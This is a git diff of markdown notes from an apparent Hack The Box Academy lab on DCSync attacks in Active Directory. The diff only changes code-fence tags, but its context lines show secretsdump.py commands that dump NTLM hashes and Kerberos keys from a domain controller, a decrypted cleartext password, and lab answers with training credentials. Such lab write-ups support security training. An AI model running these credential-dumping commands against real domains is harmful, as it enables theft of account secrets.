@@ -69,7 +69,7 @@ If we had certain rights over the user (such as [WriteDacl](https://bloodhound.s
 ### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
 Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
 
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
@@ -111,7 +111,7 @@ If we check the files created using the `-just-dc` flag, we will see that there 
 
 ### Listing Hashes, Kerberos Keys, and Cleartext Passwords
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ls inlanefreight_hashes*
 
 inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
@@ -151,7 +151,7 @@ proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
 
 ### Displaying the Decrypted Password
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
 
 proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
@@ -235,7 +235,7 @@ SSH to **10.129.44.250** (ACADEMY-EA-ATTACK01) with user `htb-student` and passw
         ```
 2. What is this user's cleartext password? **Answer:**
    - Use secretdump.py (with `adunn`:`SyncMaster757`) to decrypt the password:
-        ```sh
+        ```shellsession
         $ssh htb-student@10.129.44.250
         $secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
         <SNIP>
